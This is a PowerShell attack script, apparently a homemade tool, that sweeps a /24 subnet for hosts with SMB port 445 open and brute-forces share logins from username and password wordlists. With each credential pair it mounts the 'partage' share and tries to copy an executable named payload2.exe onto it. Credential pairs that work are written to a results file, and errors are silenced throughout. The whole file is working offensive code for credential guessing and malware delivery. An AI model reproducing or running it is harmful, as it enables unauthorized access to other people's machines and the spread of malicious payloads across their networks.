####################################################################################
#@author - Thomas Le Brun
#@version - 1.0
#@date - 06/01/2017
#@title - Forcing
####################################################################################
#network configuration
$ErrorActionPreference = "silentlycontinue"
$port = 445 
$net = read-host “what network are you going (/24 only) ? 192.168.0”

[int]$q = read-host “Start at the ip  ? 1”
[int]$p =  read-host “Stop at the ip  ? 254”
$a= Get-Content "C:\Users\thomas\Desktop\test\listeusername.txt"
$b= Get-Content "C:\Users\thomas\Desktop\test\listepassword.txt"
Remove-PSDrive "test"
$k =  read-host “Where do you whant to stock the result ?”
new-item "C:\Users\thomas\Desktop\powershell\$k.txt" –type file -force


while ($q -le $p){

    $n=$false
    $ip = "$net.$q"

    " "
    "try $ip"

    if(Test-Connection -BufferSize 32 -Count 1 -Quiet -ComputerName $ip){
       
        $socket = new-object System.Net.Sockets.TcpClient($ip, $port)

        if($socket.Connected){
            “$ip is listening to port $port”
            foreach ($c in $a){

                foreach ($d in $b){
                       
                    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $c, ($d | ConvertTo-SecureString -AsPlainText -Force)

                    "try $c with $d"
                    New-PSDrive -Name "test" -PSProvider "FileSystem" -Root "\\$ip\partage" -Credential $cred -Description "hack" 
                    Copy-Item "C:\Users\thomas\Desktop\test\dist\payload2.exe" -Destination "\\$ip\partage" 
                    $fichier=new-object system.IO.FileInfo "1"

                    $Fichier=new-object system.IO.FileInfo "\\$ip\partage\payload2.exe"

                    if ($Fichier.Get_Exists() -eq $true){
                        "ID find : $c" 
                        "Password : $d "
                        ADD-content -path "C:\Users\thomas\Desktop\powershell\$k.txt" -value "******NEW USER******"
                        ADD-content -path "C:\Users\thomas\Desktop\powershell\$k.txt" -value "Ip = $ip"
                        ADD-content -path "C:\Users\thomas\Desktop\powershell\$k.txt" -value "user = $c"
                        ADD-content -path "C:\Users\thomas\Desktop\powershell\$k.txt" -value "pwd = $d"
                        ADD-content -path "C:\Users\thomas\Desktop\powershell\$k.txt" -value "********************"
                        $n=$true
                        break
                    }
                    Remove-PSDrive "test"

                }

                if ( $n -eq $true){
 
                    break
                }
            }
            $socket.Close()
            }

        }
    else {
        “$ip is not listening on $port”
    }
    $q=$q+1
}